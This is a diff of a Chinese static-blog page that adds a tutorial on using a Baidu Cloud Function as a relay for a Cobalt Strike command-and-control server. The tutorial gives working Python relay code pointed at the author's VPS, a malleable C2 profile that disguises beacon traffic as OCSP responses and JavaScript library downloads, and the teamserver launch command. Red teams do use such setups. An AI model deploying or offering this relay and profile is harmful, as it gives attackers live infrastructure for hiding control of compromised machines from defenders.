@@ -132,30 +132,56 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      TEST
+      
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2025-08-06T08:33:58.000Z" style="display: flex; align-items: center;">
+    <time datetime="2025-08-06T09:54:57.042Z" style="display: flex; align-items: center;">
       <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
       <span>2025-08-06</span>
     </time>
     
     
     <span class="dot"></span>
-    <span>0 字</span>
+    <span>443 字</span>
     
   </div>
   
   </header>
   <div id="section" class="post-content">
-    
+    <p>1、注册进入百度云搜索云函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110648646.png" alt="image-20250603110648646" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110648646.png" class="lozad post-image"></p>
+<p>创建函数，编辑好必要信息之后点下一步</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110740297.png" alt="image-20250603110740297" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110740297.png" class="lozad post-image"></p>
+<p>运行时环境此处必须选择python3.6，否则后面的脚本无法运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111022560.png" alt="image-20250603111022560" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111022560.png" class="lozad post-image"></p>
+<p>2、进入代码编辑页</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111411146.png" alt="image-20250603111411146" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111411146.png" class="lozad post-image"></p>
+<p>将代码贴上特别注意在C2变量中需要填写自己vps的信息，建议使用http协议，以及自定义端口，如有特别需求也可以更改编码方式</p>
+<pre class="highlight"><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"> </span><br><span class="line"># def handler(event, context): </span><br><span class="line">#     return &quot;Hello World&quot;</span><br><span class="line">import json,requests,base64</span><br><span class="line">def handler(event, context):</span><br><span class="line">    C2=&#x27;https://xxxx:443&#x27;# 这里可以使用 HTTP、HTTPS~下角标~   </span><br><span class="line">    path=event[&#x27;path&#x27;]</span><br><span class="line">    headers=event[&#x27;headers&#x27;]</span><br><span class="line">    print(event)</span><br><span class="line">    if event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=False)</span><br><span class="line">    else:</span><br><span class="line">        resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False)</span><br><span class="line">    print(resp.headers)</span><br><span class="line">    print(resp.content)</span><br><span class="line">    response=&#123;</span><br><span class="line">    &quot;isBase64Encoded&quot;: True,</span><br><span class="line">    &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">    &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">    &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    #return event</span><br><span class="line">    return response</span><br></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111509971.png" alt="image-20250603111509971" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111509971.png" class="lozad post-image"></p>
+<p>3、新增触发器</p>
+<p>选择http触发器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111921985.png" alt="image-20250603111921985" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111921985.png" class="lozad post-image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112007172.png" alt="image-20250603112007172" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112007172.png" class="lozad post-image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112313063.png" alt="image-20250603112313063" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112313063.png" class="lozad post-image"></p>
+<p>云函数生成的随机域名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112604714.png" alt="image-20250603112604714" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112604714.png" class="lozad post-image"></p>
+<p>4、编写cs配置文件</p>
+<pre class="highlight"><span class="line">http-get &#123;</span><br><span class="line"> </span><br><span class="line">  set uri &quot;/api/x&quot;;</span><br><span class="line"> </span><br><span class="line">  client &#123;</span><br><span class="line">      header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">      metadata &#123;</span><br><span class="line">          base64;</span><br><span class="line">          prepend &quot;SESSIONID=&quot;;</span><br><span class="line">          header &quot;Cookie&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  server &#123;</span><br><span class="line">      header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">      header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">      header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">      output &#123;</span><br><span class="line">          base64;</span><br><span class="line">          print;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">  set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">  set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">  set uri &quot;/api/y&quot;;</span><br><span class="line">  client &#123;</span><br><span class="line">      header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">      id &#123;</span><br><span class="line">          base64;</span><br><span class="line">          prepend &quot;JSESSION=&quot;;</span><br><span class="line">          header &quot;Cookie&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      output &#123;</span><br><span class="line">          base64;</span><br><span class="line">          print;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  server &#123;</span><br><span class="line">      header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">      header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">      header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">      output &#123;</span><br><span class="line">          base64;</span><br><span class="line">          print;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
+
+<p>保存为baidu.profile</p>
+<p>cs启动命令为：.&#x2F;teamserver vps pwd baidu.profile</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112846828.png" alt="image-20250603112846828" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112846828.png" class="lozad post-image"></p>
+<p>添加监听器准备上线！</p>
+
   </div>
   <div>
   
   <div class="post-note note-info copyright" style="margin-top: 42px">
     <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">Sunean</a></p>
-    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2025/08/06/TEST/">http://example.com/2025/08/06/TEST/</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2025/08/06/%E7%99%BE%E5%BA%A6%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/">http://example.com/2025/08/06/%E7%99%BE%E5%BA%A6%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/</a></p>
     <p><span style="font-weight: bold;">版权声明：</span>转载分享请注明出处</p>
   </div>
   
@@ -256,7 +282,7 @@
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2025-08-06</div>
-        <a href="/2025/08/06/TEST/"><div class="recent-posts-item-content">TEST</div></a>
+        <a href="/2025/08/06/百度云函数配置/"><div class="recent-posts-item-content"></div></a>
       </div>
     
       <div class="recent-posts-item">
